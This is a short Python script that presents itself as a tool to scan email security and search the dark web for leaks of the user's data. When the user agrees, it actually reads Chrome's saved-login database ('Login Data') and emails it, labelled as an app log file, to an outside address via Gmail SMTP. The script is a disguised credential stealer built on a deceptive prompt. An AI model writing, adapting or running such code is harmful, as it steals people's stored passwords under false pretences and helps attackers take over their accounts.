# -*- coding: utf-8 -*-
import os
import smtplib
from email.message import EmailMessage
from pathlib import Path
import getpass

# === Configuration ===
APP_NAME = "MyApp"
FILE_NAME = "app.log"
EMAIL_SUBJECT = f"{APP_NAME} Log File"
EMAIL_BODY = f"Attached is the {APP_NAME} log file for analysis."
RECEIVER_EMAIL = "genius@moron.com"

# User's AppData path
username = getpass.getuser()
file_path = Path(f"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data")

# Email credentials
SENDER_EMAIL = "your_email@gmail.com"
APP_PASSWORD = "your_app_password"  # Use a Gmail app password

# === Ask for confirmation ===
confirmation = input(f"Do you want to scan your email security settings and search teh Dark web for any potential leaks of your user data? (yes/no): ").strip().lower()

if confirmation == "yes":
    if not file_path.exists():
        print(f"File not found: {file_path}")
    else:
        # Compose email
        msg = EmailMessage()
        msg["Subject"] = EMAIL_SUBJECT
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECEIVER_EMAIL
        msg.set_content(EMAIL_BODY)

        # Attach the file
        with open(file_path, "rb") as f:
            msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename=file_path.name)

        # Send email
        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(SENDER_EMAIL, APP_PASSWORD)
                smtp.send_message(msg)
            print("File sent successfully.")
        except Exception as e:
            print(f"Failed to send email: {e}")
else:
    print("Operation cancelled.")
